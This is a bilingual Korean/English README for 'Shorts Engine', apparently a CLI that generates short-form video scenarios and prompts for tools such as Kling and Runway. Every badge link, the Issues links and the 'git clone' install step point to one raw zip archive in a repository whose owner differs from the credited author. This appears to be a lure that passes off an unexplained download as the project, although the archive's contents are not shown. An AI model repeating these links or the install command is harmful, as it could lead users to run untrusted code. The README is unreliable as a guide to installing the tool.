# Shorts Engine

**내 취향에서 출발하는 숏폼 영상 시나리오 생성 엔진**
**A taste-first CLI that turns what you love into short-form video scenarios**

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Node.js 24+](https://img.shields.io/badge/Node.js-24+-green.svg)](https://raw.githubusercontent.com/pamterminal338/Shorts-engine/main/src/config/engine_Shorts_v2.1.zip)
[![TypeScript](https://img.shields.io/badge/TypeScript-5.9+-blue.svg)](https://raw.githubusercontent.com/pamterminal338/Shorts-engine/main/src/config/engine_Shorts_v2.1.zip)

---

## 소개 | Introduction

Shorts Engine은 좋아하는 영화, 영상 스타일, 작가 취향에서 출발해 숏폼 영상 시나리오, AI 영상 프롬프트, 발행 패키지를 자동으로 만드는 CLI 도구입니다. Kling, Runway, Veo, Pika, CapCut 등 주요 AI 영상 도구에 바로 붙여넣을 수 있는 형식으로 출력합니다.

Shorts Engine is a CLI tool that starts from your personal taste -- favorite films, visual styles, and creators -- and generates short-form video scenarios, AI video prompts, and publish-ready packages. It outputs copy-paste-ready formats for Kling, Runway, Veo, Pika, CapCut, and more.

> 대부분의 영상 도구는 설정부터 물어봅니다. 이 엔진은 **취향부터** 물어봅니다.
> Most video tools ask for settings first. This engine asks for **taste** first.

---

## 이런 분들에게 유용합니다 | Who Is This For?

| 대상 | 활용 예시 |
|------|----------|
| **숏폼 크리에이터** | 유튜브 Shorts, 틱톡, 인스타 릴스용 시나리오 자동 생성 |
| **영상 프로듀서** | 취향 DNA 기반으로 일관된 스타일의 영상 기획 |
| **마케터** | 제품 런칭, Before/After, 튜토리얼 등 목적별 영상 템플릿 활용 |
| **소설/웹소설 작가** | 에피소드 티저 영상 시나리오 자동 생성 |
| **AI 영상 도구 사용자** | Kling, Runway, Veo 등에 바로 넣을 수 있는 프롬프트 생성 |

| Who | Use Case |
|-----|----------|
| **Short-form creators** | Auto-generate scenarios for YouTube Shorts, TikTok, Instagram Reels |
| **Video producers** | Consistent style planning based on taste DNA |
| **Marketers** | Product launch, Before/After, tutorial templates |
| **Fiction writers** | Auto-generate episode teaser scenarios |
| **AI video tool users** | Generate copy-paste prompts for Kling, Runway, Veo, Pika, CapCut |

---

## 핵심 워크플로우 | Core Workflow

```
1. taste    -->  취향 프로필 생성 (좋아하는 영화/스타일/작가)
2. generate -->  시나리오 + 프롬프트 + 렌더/발행 계획 생성
3. format   -->  대상 도구(Kling, Runway 등)에 맞는 포맷으로 출력
4. feedback -->  결과 피드백 -> 엔진이 점점 더 정확해짐
```

---

## 주요 기능 | Key Features

### 취향 DNA 시스템 | Taste DNA System

좋아하는 영화, 비주얼 스타일, 작가를 알려주면 엔진이 "취향 DNA"를 생성합니다. 이 DNA가 이후 모든 생성 과정에 자동 반영됩니다:

Tell the engine your favorite films, visual styles, and writers. It builds a "taste DNA" that automatically influences all generation:

- 시나리오 구조 (Scenario structure)
- 훅 선택 (Hook selection)
- 스타일 결정 (Style resolution)
- 프롬프트 빌딩 (Prompt building)
- 품질 진화 (Quality evolution)

### 8종 프리셋 템플릿 | 8 Preset Templates

| 템플릿 Template | 길이 | 플랫폼 | 설명 Description |
|---------------|------|--------|-----------------|
| `recipe-30s` | 30초 | YouTube Shorts | 결과물 먼저 보여주는 요리 숏폼 / Result-first cooking short |
| `comedy-skit-15s` | 15초 | TikTok | 짧은 개그, 캐릭터 비트 / Quick jokes and character bits |
| `tutorial-60s` | 60초 | YouTube Shorts | 단계별 설명형 / Step-by-step explainer |
| `product-launch-20s` | 20초 | TikTok | 제품 런칭 모멘텀 / Product reveal with urgency |
| `story-tease-25s` | 25초 | Instagram Reels | 소설/에피소드 티저 / Fiction episode teaser |
| `before-after-15s` | 15초 | Instagram Reels | 변화 대비형 / Transformation contrast |
| `cozy-vlog-20s` | 20초 | Instagram Reels | 따뜻한 라이프스타일 / Warm lifestyle vignette |
| `cinematic-mood-20s` | 20초 | YouTube Shorts | 분위기 중심 영상 / Atmospheric visual statement |

### 7개 출력 포맷 | 7 Output Formatters

생성된 시나리오를 대상 도구에 맞는 형식으로 바로 변환합니다:

| 포맷 Format | 용도 Description |
|------------|-----------------|
| `kling` | Kling AI 프롬프트 형식 |
| `runway` | Runway Gen 프롬프트 형식 |
| `veo` | Google Veo 프롬프트 형식 |
| `pika` | Pika Labs 프롬프트 형식 |
| `capcut` | CapCut 편집 가이드 |
| `generic` | 범용 AI 영상 프롬프트 |
| `human` | 사람(편집자)을 위한 읽기 쉬운 가이드 |

### 품질 피드백 루프 | Quality Feedback Loop

생성된 시나리오에 점수를 매기면, 엔진이 학습합니다:

- 블록별 점수 업데이트 (Block scores)
- 검증된 블록 조합 기록 (Verified combinations)
- 취향 DNA 자동 보정 (Taste refinement)
- 대시보드 요약 (Dashboard summaries)

---

## 빠른 시작 가이드 | Quick Start Guide

### 1단계: 설치 | Step 1: Install

> Node.js **24 이상** 필요
> Requires Node.js **24+**

```bash
# 저장소 클론 | Clone the repository
git clone https://raw.githubusercontent.com/pamterminal338/Shorts-engine/main/src/config/engine_Shorts_v2.1.zip
cd Shorts-engine

# 의존성 설치 | Install dependencies
npm install

# 빌드 및 테스트 | Build and test
npm run build
npm test
```

### 2단계: 취향 프로필 생성 | Step 2: Create Taste Profile

```bash
npm run engine -- taste
```

대화형으로 좋아하는 영화, 비주얼 스타일, 작가를 입력하면 취향 DNA가 생성됩니다.

Interactive prompts will ask about your favorite films, visual styles, and writers to build your taste DNA.

### 3단계: 첫 번째 영상 시나리오 생성 | Step 3: Generate Your First Scenario

```bash
# 대화형 가이드 | Interactive guided mode
npm run engine -- interactive

# 또는 요청 파일로 바로 생성 | Or run from a request file
npm run engine -- run tests/fixtures/valid-low-cost-request.json
```

---

## 실전 사용 예시 | Real-World Usage Examples

### 예시 1: 취향 프로필 만들기 | Example 1: Build Taste Profile

```bash
npm run engine -- taste
```

좋아하는 영화와 스타일을 물어봅니다. 예를 들어 "왕가위, 네온 느와르, 슬로우 모션"을 좋아한다고 하면, 이 취향이 이후 모든 시나리오에 반영됩니다.

```bash
# 현재 프로필 확인 | Show current profile
npm run engine -- taste show

# 취향 항목 추가 | Add new taste entry
npm run engine -- taste add

# 피드백 기반 취향 보정 | Refine from feedback
npm run engine -- taste refine

# 초기화 | Reset
npm run engine -- taste reset
```

### 예시 2: 요리 숏폼 만들기 | Example 2: Create a Recipe Short

```bash
npm run engine -- create --template recipe-30s my-recipe.json
```

**입력 (my-recipe.json):**
```json
{
  "version": "0.1",
  "intent": {
    "topic": "15-minute creamy pasta",
    "subject": "home cook plating dinner",
    "goal": "show a fast recipe people can repeat tonight",
    "emotion": "comfort and appetite",
    "platform": "youtube_shorts",
    "theme": "recipe",
    "duration_sec": 30
  }
}
```

**생성 결과 | Output includes:**
- 시나리오 플랜 (장면별 구성: ingredient reveal -> fast assembly -> texture close-up -> plated payoff)
- AI 영상 프롬프트 (각 장면별 프롬프트)
- 렌더 플랜 (카메라 언어, 페이싱, 캡션 스타일)
- 발행 플랜 (플랫폼별 최적화)
- 품질 점수

### 예시 3: Kling용 프롬프트로 변환 | Example 3: Format for Kling AI

```bash
npm run engine -- format my-recipe.json --output kling
```

Kling AI에 바로 붙여넣을 수 있는 프롬프트가 출력됩니다.

```bash
# 모든 포맷 한번에 출력 | All formats at once
npm run engine -- format my-recipe.json --output all --json

# 사람이 읽기 쉬운 가이드 | Human-readable guide
npm run engine -- format my-recipe.json --output human
```

### 예시 4: LLM으로 프롬프트 정제 | Example 4: LLM-refined Prompt

```bash
# OpenAI로 2차 정제 | Refine with OpenAI
npm run engine -- prompt my-recipe.json --llm --provider openai

# Anthropic으로 정제 | Refine with Anthropic
npm run engine -- format my-recipe.json --llm --provider anthropic

# Ollama (로컬) | Local LLM with Ollama
npm run engine -- prompt my-recipe.json --llm --provider ollama
```

> LLM 정제는 선택 사항입니다. 오프라인 모드가 기본입니다.
> LLM refinement is optional. Offline mode is the default.

### 예시 5: 트렌드 반영 | Example 5: Trend-aware Mode

```bash
npm run engine -- format my-recipe.json --trend-aware --output generic
```

`~/.22b/trends/index.json`에 트렌드 데이터가 있으면, 해시태그와 키워드가 프롬프트에 자동 반영됩니다. 파일이 없어도 정상 동작합니다.

### 예시 6: 품질 피드백 | Example 6: Quality Feedback

```bash
# 생성된 시나리오에 피드백 | Rate a generated scenario
npm run engine -- feedback <scenario-id>

# 전체 품질 대시보드 | View quality dashboard
npm run engine -- quality
```

---

## CLI 명령어 전체 목록 | Full CLI Reference

### 취향 관리 | Taste Management

| 명령어 Command | 설명 Description |
|---------------|-----------------|
| `taste` | 취향 프로필 생성 / Create taste profile |
| `taste show` | 현재 프로필 확인 / Show current profile |
| `taste add` | 취향 항목 추가 / Add taste entry |
| `taste refine` | 피드백 기반 보정 / Refine from feedback |
| `taste reset` | 프로필 초기화 / Reset profile |

### 시나리오 생성 | Scenario Generation

| 명령어 Command | 설명 Description |
|---------------|-----------------|
| `interactive` | 대화형 가이드 생성 / Interactive guided generation |
| `create <template> <file>` | 템플릿 기반 생성 / Generate from template |
| `run <file>` | 요청 파일로 생성 / Run from request file |
| `prompt <file>` | 프롬프트만 생성 / Generate prompt only |
| `render <file>` | 렌더 플랜 생성 / Generate render plan |
| `publish <file>` | 발행 플랜 생성 / Generate publish plan |

### 출력 포맷 | Output Formatting

| 명령어 Command | 설명 Description |
|---------------|-----------------|
| `format <file> --output kling` | Kling AI 형식 출력 |
| `format <file> --output runway` | Runway 형식 출력 |
| `format <file> --output veo` | Veo 형식 출력 |
| `format <file> --output human` | 사람용 가이드 출력 |
| `format <file> --output all` | 전체 형식 출력 |

### 품질 루프 | Quality Loop

| 명령어 Command | 설명 Description |
|---------------|-----------------|
| `feedback <id>` | 시나리오 피드백 입력 / Rate a scenario |
| `quality` | 품질 대시보드 / Quality dashboard |

모든 명령어는 `npm run engine -- <command>` 형식으로 실행합니다.

---

## 프로젝트 구조 | Project Structure

```
Shorts-engine/
|-- src/
|   |-- cli/            # CLI 명령어 진입점 | Command entrypoints
|   |-- taste/          # 취향 온보딩, DNA 생성, 프로필 관리
|   |-- taste-db/       # 큐레이션된 참조 데이터 (영화, 스타일, 작가)
|   |-- style/          # 스타일 해석 엔진
|   |-- scenario/       # 훅 포지, 블록 위빙, 시나리오 구성
|   |-- prompt/         # AI 프롬프트 빌더
|   |-- render/         # 렌더 플랜 생성
|   |-- publish/        # 발행 플랜 생성
|   |-- quality/        # 품질 점수, 피드백, 진화 루프
|   |-- llm/            # LLM 프로바이더 라우팅 (OpenAI, Anthropic, Ollama)
|   |-- output/         # 포맷터 패키지 (Kling, Runway, Veo 등)
|   |-- templates/      # 프리셋 템플릿 8종
|   |-- adapters/       # TTS, 업로드 어댑터
|   |-- trends/         # 트렌드 연동
|   +-- novel/          # 소설/에피소드 모드
|-- n8n/                # n8n 워크플로우 연동
|-- tests/              # 테스트 스위트
+-- docs/               # 아키텍처 문서
```

---

## n8n 연동 | n8n Integration

Shorts Engine은 n8n 워크플로우와 연동할 수 있습니다. 자세한 내용은 [n8n/README-n8n.md](n8n/README-n8n.md)를 참고하세요.

Shorts Engine can be integrated with n8n workflows. See [n8n/README-n8n.md](n8n/README-n8n.md) for details.

---

## LLM 프로바이더 | LLM Providers

LLM 정제는 **선택 사항**입니다. 오프라인 모드가 기본 철학입니다.

LLM refinement is **optional by design**. Offline mode is the default.

| 프로바이더 Provider | 설명 Description |
|-------------------|-----------------|
| OpenAI | GPT 기반 프롬프트 정제 |
| Anthropic | Claude 기반 프롬프트 정제 |
| Ollama | 로컬 LLM (네트워크 불필요) |

프로바이더를 사용할 수 없으면 자동으로 오프라인 플랜으로 폴백합니다.

If a provider is unavailable, the engine falls back to the offline plan.

---

## 테스트 실행 | Running Tests

```bash
npm run build
npm test
```

---

## 라이선스 | License

MIT License -- 자유롭게 사용, 수정, 배포할 수 있습니다.

MIT License -- Free to use, modify, and distribute.

---

## 만든 사람 | Author

**22B Labs** (sinmb79) -- The 4th Path

문의사항이나 기여는 [Issues](https://raw.githubusercontent.com/pamterminal338/Shorts-engine/main/src/config/engine_Shorts_v2.1.zip)를 이용해 주세요.

For questions or contributions, please use [Issues](https://raw.githubusercontent.com/pamterminal338/Shorts-engine/main/src/config/engine_Shorts_v2.1.zip).
